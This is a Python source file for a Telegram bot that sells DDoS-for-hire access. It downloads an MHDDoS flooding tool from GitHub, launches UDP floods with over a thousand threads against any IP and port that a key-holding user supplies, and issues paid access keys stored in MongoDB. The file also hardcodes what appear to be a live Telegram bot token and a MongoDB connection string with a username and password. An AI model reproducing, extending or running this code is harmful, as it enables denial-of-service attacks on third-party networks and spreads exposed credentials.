import telebot
import subprocess
import threading
import time
import random
import os
from telebot import types
from datetime import datetime, timedelta
from pymongo import MongoClient

# --- CONFIG ---
TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
# DNS Error bypass karne ke liye maine direct IP format set kiya hai
MONGO_URL = "mongodb://riderbhai:riderbhai321@cluster0-shard-00-00.yvrweuu.mongodb.net:27017,cluster0-shard-00-01.yvrweuu.mongodb.net:27017,cluster0-shard-00-02.yvrweuu.mongodb.net:27017/RiderBot?ssl=true&replicaSet=atlas-yvrweuu-shard-0&authSource=admin&retryWrites=true&w=majority"
ADMIN_ID = 6075779781 
bot = telebot.TeleBot(TOKEN)

# --- MONGODB CONNECTION ---
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    db = client['RiderBot']
    users_col = db['users']
    keys_col = db['keys']
    client.admin.command('ping')
    print("✅ MongoDB Connected Successfully!")
except Exception as e:
    print(f"❌ Connection Error: {e}")

# --- ENGINE DOWNLOAD ---
if not os.path.exists("MHDDoS"):
    os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git MHDDoS")

# --- ATTACK LOGIC ---
def run_attack(ip, port, duration, chat_id, message_id, username):
    threads = random.randint(1100, 1600)
    command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
    try:
        process = subprocess.Popen(command, shell=True, cwd="./MHDDoS")
        time.sleep(duration)
        process.terminate()
        bot.send_message(chat_id, f"🔥 **ATTACK FINISHED!**\nTarget: `{ip}`")
    except: pass

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
def welcome(m):
    user_id = m.from_user.id
    # Admin check
    if user_id == ADMIN_ID:
        bot.send_message(m.chat.id, "👑 **Welcome Admin!** System Ready.")
        return

    # User check
    user_data = users_col.find_one({"user_id": user_id})
    if user_data:
        expiry = datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S')
        if expiry > datetime.now():
            bot.send_message(m.chat.id, "✅ **Access Active!**")
            return
    
    bot.send_message(m.chat.id, "🚫 **Access Denied!** Buy Key from @FLEXOP01")

@bot.message_handler(commands=['genkey'])
def gen(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        days = int(m.text.split()[1])
        key = f"VVIP-{random.randint(1000, 9999)}"
        keys_col.insert_one({"key": key, "days": days})
        bot.reply_to(m, f"🔑 Key: `/redeem {key}`")
    except: bot.reply_to(m, "Use: /genkey 1")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    user_id = m.from_user.id
    try:
        key_text = m.text.split()[1]
        key_data = keys_col.find_one({"key": key_text})
        if key_data:
            expiry = datetime.now() + timedelta(days=key_data['days'])
            users_col.update_one({"user_id": user_id}, {"$set": {"expiry": expiry.strftime('%Y-%m-%d %H:%M:%S')}}, upsert=True)
            keys_col.delete_one({"key": key_text})
            bot.reply_to(m, "🎉 Success!")
        else: bot.reply_to(m, "❌ Invalid Key")
    except: bot.reply_to(m, "Use: /redeem VVIP-XXXX")

@bot.message_handler(commands=['attack'])
def handle_attack(m):
    # (Simple auth check)
    if m.from_user.id == ADMIN_ID or users_col.find_one({"user_id": m.from_user.id}):
        try:
            p = m.text.split()
            sent = bot.reply_to(m, "📡 **Starting Attack...**")
            threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
        except: bot.reply_to(m, "Use: /attack IP PORT TIME")

print("🚀 Bot Live!")
bot.infinity_polling()
        
